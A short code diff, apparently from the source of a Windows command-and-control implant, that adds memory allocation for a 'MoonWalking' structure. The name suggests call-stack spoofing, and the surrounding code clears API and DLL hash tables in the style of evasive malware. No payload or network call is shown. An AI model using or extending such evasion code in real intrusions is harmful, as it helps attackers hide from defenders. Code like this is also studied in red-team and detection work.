@@ -242,6 +242,7 @@ INT init_agent() {
 	RtlSecureZeroMemory(ApiHashes, sizeof(ApiHashes));
 	RtlSecureZeroMemory(DllHashes, sizeof(DllHashes));
 
+    //initialize some memory for the agent's context.
     agent->Context = (PContextInfo)agent->apis->pLocalAlloc(LPTR, sizeof(ContextInfo));
     if (!agent->Context) {
         printf("[error] attempting to allocate memory for context\n");
@@ -253,6 +254,17 @@ INT init_agent() {
 		printf("[error] attempting to allocate memory for session\n");
 		return -1;
 	}
+
+    agent->Walker = (pMoonWalking)agent->apis->pLocalAlloc(LPTR, sizeof(MoonWalking));
+    if(!agent->Walker) {
+        printf("[error] attempting to allocate memory for walker\n");
+        return -1;
+    }
+    agent->Walker->Arguments = (PArgs)agent->apis->pLocalAlloc(LPTR, sizeof(Args));
+    if(!agent->Walker->Arguments) {
+        printf("[error] attempting to allocate memory for walker arguments\n");
+        return -1;
+    }
 
 
 #if _WIN64
